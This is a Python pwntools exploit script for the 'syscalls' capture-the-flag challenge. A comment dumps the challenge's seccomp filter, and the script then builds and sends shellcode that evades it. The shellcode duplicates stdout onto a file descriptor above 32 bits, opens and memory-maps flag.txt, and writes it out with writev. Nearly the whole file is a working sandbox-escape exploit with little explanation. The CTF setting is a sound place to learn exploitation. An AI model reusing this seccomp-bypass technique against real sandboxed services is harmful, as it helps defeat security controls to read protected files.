#!/usr/bin/env python3

from pwn import *

exe = ELF("./syscalls")
context.update(arch = "amd64")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("syscalls.chal.uiuc.tf", 1337, ssl = True)

    return r

'''
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
'''

def generate_shellcode():

    # Map STDOUT to a fd we can use
    sc = shellcraft.dup2(constants.STDOUT_FILENO, 0x100000000)

    # Open file
    sc += shellcraft.openat(-100, "flag.txt", 0, 0)

    # Map file into memory
    sc += shellcraft.mmap(0, 0x80, constants.PROT_READ, constants.MAP_PRIVATE, 3, 0)

    # Write mapped file to stdout
    sc += shellcraft.push(0x80)
    sc += shellcraft.push("rax")

    # Write to stdout using new fd for stdout
    sc += shellcraft.writev(0x100000000, "rsp", 1)

    # Unmap file from memory
    sc += shellcraft.exit(0)

    return asm(sc)



def main():
    r = conn()

    payload = generate_shellcode()
    r.sendlineafter(b"give you.", payload)

    log.success("Flag obtained: " + r.recvallS().strip().replace("\x00", ""))

if __name__ == "__main__":
    main()

